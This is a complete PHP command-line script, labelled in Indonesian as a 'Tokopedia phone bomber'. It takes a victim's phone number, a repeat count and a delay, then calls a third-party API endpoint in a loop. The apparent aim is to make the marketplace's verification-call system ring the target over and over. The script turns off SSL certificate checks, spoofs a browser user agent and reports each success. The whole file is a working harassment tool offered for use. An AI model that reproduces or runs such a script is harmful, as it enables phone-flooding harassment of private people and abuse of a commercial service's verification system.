<?php
echo "\n\e[1;35m============================[ BOM TELP TOKOPEDIA ]==========================\e[0m\r\n";
echo "\n\e[1;35m*INFO\e[0m\r";
echo "\n\e[1;35mMAX 3X SEHARI / NOMOR\e[0m\r";

echo "\n\nNomor : ";
$no = trim(fgets(STDIN));

echo "Jumlah : ";
$jumlah = trim(fgets(STDIN));

echo "Jeda : ";
$wait = trim(fgets(STDIN));

for ($x=1; $x<=$jumlah; $x++) {
sleep($wait);
$ch = curl_init();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://api.petaniilmu.com/api/api-bomtelptokopedia.php?bomtelp=".$no);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        $server_output = json_decode($server_output, TRUE);
        if ($server_output['code'] == "200000") {
            echo "[".$x."/".$jumlah."] [".$no."] \e[1;32mSuccess\e[0m\n";
        }
        else {
            echo "[".$x."/".$jumlah."] [".$no."] \e[0;31mFailed!\e[0m\n";
        }
       }
?>